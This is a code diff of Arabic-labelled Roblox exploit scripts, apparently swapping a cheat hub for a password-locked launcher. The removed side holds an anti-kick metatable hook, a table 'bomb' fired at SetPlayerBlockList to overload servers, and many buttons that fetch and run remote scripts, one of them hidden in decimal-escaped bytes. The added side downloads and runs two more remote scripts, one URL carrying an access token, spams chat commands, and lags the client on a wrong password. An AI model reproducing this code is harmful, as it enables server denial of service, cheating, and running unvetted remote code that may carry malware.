@@ -1,391 +1,176 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/Gghxgddhdmz/Orion/refs/heads/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "كل الي تحتاجه", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
---[[
-Name = <string> - The name of the UI.
-HidePremium = <bool> - Whether or not the user details shows Premium status or not.
-SaveConfig = <bool> - Toggles the config saving in the UI.
-ConfigFolder = <string> - The name of the folder where the configs are saved.
-IntroEnabled = <bool> - Whether or not to show the intro animation.
-IntroText = <string> - Text to show in the intro animation.
-IntroIcon = <string> - URL to the image you want to use in the intro animation.
-Icon = <string> - URL to the image you want displayed on the window.
-CloseCallback = <function> - Function to execute when the window is closed.
-]]
 
-local Tab = Window:MakeTab({
-	Name = "باتش",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-
-Tab:AddButton({
-	Name = "باتش 😹🤙!",
-	Callback = function()
---[[ 
-  Patch Anti-Shutdown لمدة 9000 ساعة (375 يوم)
-  يعمل في السيرفرات الخاصة فقط
---]]
-
-if not game.PrivateServerId or game.PrivateServerId == "" then
-    warn("هذا السكربت مخصص للسيرفرات الخاصة فقط.")
-    return
+-- تشفير بسيط للكود 🔒
+local function encode(str)
+    local res = {}
+    for i = 1, #str do
+        res[i] = string.char(string.byte(str, i) + 3)
+    end
+    return table.concat(res)
 end
 
-local Players = game:GetService("Players")
-local Lighting = game:GetService("Lighting")
-local CoreGui = game:GetService("CoreGui")
-local StarterGui = game:GetService("StarterGui")
-
--- حماية من الشات، التغبيش، الرسائل، الكيك
-pcall(function()
-    Lighting.Blur:Destroy()
-end)
-
-game.DescendantAdded:Connect(function(obj)
-    if obj:IsA("BlurEffect") then
-        obj:Destroy()
-    elseif obj:IsA("Message") or obj:IsA("Hint") then
-        obj:Destroy()
+local function decode(str)
+    local res = {}
+    for i = 1, #str do
+        res[i] = string.char(string.byte(str, i) - 3)
     end
-end)
-
--- تعطيل الرسائل الوهمية
-StarterGui:SetCore("ResetButtonCallback", false)
-StarterGui:SetCore("DevConsoleVisible", false)
-
--- منع الكيك أو الشت داون
-local mt = getrawmetatable(game)
-setreadonly(mt, false)
-
-local old = mt.__namecall
-
-mt.__namecall = newcclosure(function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
-
-    if method == "Kick" or method == "kick" then
-        warn("تم منع محاولة كيك.")
-        return nil
-    end
-
-    if self == game and method == "Shutdown" then
-        warn("تم منع محاولة شت داون.")
-        return nil
-    end
-
-    return old(self, unpack(args))
-end)
-
--- مؤقت 9000 ساعة (يوقف السكربت بعدها)
-task.spawn(function()
-    local totalTime = 9000 * 3600 -- 9000 ساعة
-    local start = tick()
-
-    while tick() - start < totalTime do
-        task.wait(60) -- انتظار كل دقيقة لتقليل الضغط
-    end
-
-    warn("انتهى وقت الباتش بعد 9000 ساعة، سيتم الإغلاق.")
-    game:Shutdown()
-end)
-
-print("تم تفعيل الباتش بنجاح! سيبقى شغال لمدة 9000 ساعة.")
-end    
-})
-
-Tab:AddButton({
-	Name = "باتش2",
-	Callback = function()
-      		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(3000) -- تحديد حد أقل للنقل لتقليل الحمل
-
-local function getmaxvalue(val)
-    local mainvalueifonetable = 5000 -- تقليل القيمة الأساسية
-    if type(val) ~= "number" then
-        return nil
-    end
-    local calculateperfectval = (mainvalueifonetable / (val + 2))
-    return calculateperfectval
+    return table.concat(res)
 end
 
-local function bomb(tableincrease, tries)
-    local maintable = {}
-    local spammedtable = {}
+local secret_encoded = encode("CATAYxMADARA")
 
-    table.insert(spammedtable, {})
-    z = spammedtable[1]
-
-    for i = 1, tableincrease do
-        local tableins = {}
-        table.insert(z, tableins)
-        z = tableins
+local function causeLag(durationSeconds)
+    local startTime = tick()
+    while tick() - startTime < durationSeconds do
+        for i = 1, 10000 do
+            local a = i * i * i
+        end
+        RunService.Heartbeat:Wait()
     end
+end
 
-    local calculatemax = getmaxvalue(tableincrease)
-    local maximum
+-- إنشاء GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CATAYxMADARA_GUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = game.CoreGui
 
-    if calculatemax then
-        maximum = calculatemax
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 350, 0, 180)
+frame.Position = UDim2.new(0.5, -175, 0.5, -90)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+frame.Active = true
+frame.Draggable = true
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+title.BorderSizePixel = 0
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.Text = "✨ سكربت LEGENDS  👑"
+title.Parent = frame
+
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 35, 0, 35)
+closeButton.Position = UDim2.new(1, -40, 0, 3)
+closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Font = Enum.Font.GothamBold
+closeButton.TextSize = 25
+closeButton.Text = "×"
+closeButton.Parent = frame
+
+local restoreButton = Instance.new("TextButton")
+restoreButton.Size = UDim2.new(0, 120, 0, 35)
+restoreButton.Position = UDim2.new(0.5, -60, 1, 10)
+restoreButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+restoreButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+restoreButton.Font = Enum.Font.GothamBold
+restoreButton.TextSize = 18
+restoreButton.Text = "استعادة الواجهة 🔄"
+restoreButton.Parent = screenGui
+restoreButton.Visible = false
+
+local passwordBox = Instance.new("TextBox")
+passwordBox.Size = UDim2.new(1, -40, 0, 40)
+passwordBox.Position = UDim2.new(0, 20, 0, 60)
+passwordBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+passwordBox.Font = Enum.Font.Gotham
+passwordBox.TextSize = 18
+passwordBox.PlaceholderText = "ادخل كلمة السر 🔑"
+passwordBox.ClearTextOnFocus = true
+passwordBox.Parent = frame
+
+local activateButton = Instance.new("TextButton")
+activateButton.Size = UDim2.new(1, -40, 0, 40)
+activateButton.Position = UDim2.new(0, 20, 0, 110)
+activateButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+activateButton.Font = Enum.Font.GothamBold
+activateButton.TextSize = 20
+activateButton.Text = "تفعيل السكربت ⚙️"
+activateButton.Parent = frame
+
+local function hideGui()
+    frame.Visible = false
+    restoreButton.Visible = true
+end
+
+local function showGui()
+    frame.Visible = true
+    restoreButton.Visible = false
+end
+
+closeButton.MouseButton1Click:Connect(hideGui)
+restoreButton.MouseButton1Click:Connect(showGui)
+
+local commands = {
+    "datalimit 0",
+    "antiidle",
+    "freezeua",
+    "backtrack 350",
+    "2022materials",
+    "setfpscap(15)",
+    "Clientantikick",
+    "nolight",
+    "nofog",
+    "Autokeypress w 500",
+    "Autokeypress down 500",
+    "antikick",
+    "datalimit 200",
+    "nogshadown",
+    "brightness",
+    "Amttool",
+    "xray",
+    "sandbox",
+    "Ds"
+}
+
+local commandsExecuted = {}
+
+activateButton.MouseButton1Click:Connect(function()
+    local input = passwordBox.Text
+    if encode(input) == secret_encoded then
+        activateButton.Text = "جاري التفعيل... ⏳"
+        activateButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
+        activateButton.Active = false
+        passwordBox.ClearTextOnFocus = false
+
+        -- تحميل السكربتين
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/MADARA9223/CATAYxMADARA/main/CATAYxMADARAv1"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/MADARA9223/CATAYxMADARA2/refs/heads/main/CATAYxMADARAv2?token=GHSAT0AAAAAADDWD5GHIPHL4XR5JYL33DFC2BMZN7A"))()
+        end)
+
+        -- تنفيذ الأوامر مع تأخير 5 ثواني بينها
+        coroutine.wrap(function()
+            for _, cmd in ipairs(commands) do
+                if not commandsExecuted[cmd] then
+                    commandsExecuted[cmd] = true
+                    wait(5)
+                    pcall(function()
+                        game:Chat(cmd)
+                    end)
+                end
+            end
+        end)()
+
+        activateButton.Text = "تم التفعيل ✅"
+        activateButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
     else
-        maximum = 5000 -- تعديل القيمة القصوى إلى 5000
+        activateButton.Text = "كلمة السر خطأ ❌"
+        activateButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+        causeLag(5)
+        activateButton.Text = "تفعيل السكربت ⚙️"
+        activateButton.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        passwordBox.Text = "LEGENDS"
     end
-
-    for i = 1, maximum do
-        table.insert(maintable, spammedtable)
-    end
-
-    for i = 1, tries do
-        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-    end
-end
-
-bomb(10, 1) -- تنفيذ العملية مرة واحدة
-  	end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
-local Tab = Window:MakeTab({
-	Name = "سكربتات صمله",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-
-Tab:AddButton({
-	Name = "صمله 1 😹🤙!",
-	Callback = function()
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-v-AntiKick-V3-v-Kick-Attempt-Logger-27977"))()
-end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
-
-Tab:AddButton({
-	Name = " .شغله وانت ساكت!",
-	Callback = function()
-      		loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
-  	end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
-Tab:AddButton({
-	Name = " . جوست هوب !",
-	Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
-  	end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
-
-Tab:AddButton({
-	Name = "FLY 1",
-	Callback = function()
---ARCEUS X FLY V2 SCRIPT
-loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "سكاي هيب",
-	Callback = function()
-loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Sky-Hub-10706"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "صمله 2",
-	Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/brosula123/Anti-afk/main/Bl%C3%B8xzScript"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "اختفاء",
-	Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "سكربت التاج",
-	Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/main/VR7%20RAGDOLL"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "ايذا احد طلع يجيك اشعار",
-	Callback = function()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "صمله5",
-	Callback = function()
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AntiAFK-script-18076"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "صمله6",
-	Callback = function()
-loadstring(game:HttpGet("https://zxfolix.github.io/antiafk.lua"))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "صمله7",
-	Callback = function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
-  	end    
-})
-
-Tab:AddButton({
-	Name = "صمله تحكم تلقائي8",
-	Callback = function()
-loadstring(game:GetObjects("rbxassetid://15050819751")[1].Source)()
-  	end    
-})
-
-local Tab = Window:MakeTab({
-	Name = "اوامر",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-
-local Section = Tab:AddSection({
-	Name = "xray يقلل الاق"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "antiafk ميخليك تطلع"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "anticrashيعدم الاق"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "Allowrj"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "Autorj"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "Cray"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "Antikick"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "datalimit 0"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "Nogui"
-})
-
---[[
-Name = <string> - The name of the section.
-]]
-
-local Section = Tab:AddSection({
-	Name = "ملاحضه بسكربت انفنتي يلد حطهن"
-})
-
-local Tab = Window:MakeTab({
-	Name = "طرق",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
-})
-
---[[
-Name = <string> - The name of the tab.
-Icon = <string> - The icon of the tab.
-PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
-]]
-
-Tab:AddButton({
-	Name = "امر ANTIAFK صنعي",
-	Callback = function()
-      	local vu = game:GetService("VirtualUser")
-game:GetService("Players").LocalPlayer.Idled:Connect(function()
-   vu:CaptureController()
-   vu:ClickButton2(Vector2.new())
-end)	
-  	end    
-})
-
---[[
-Name = <string> - The name of the button.
-Callback = <function> - The function of the button.
-]]
+end)
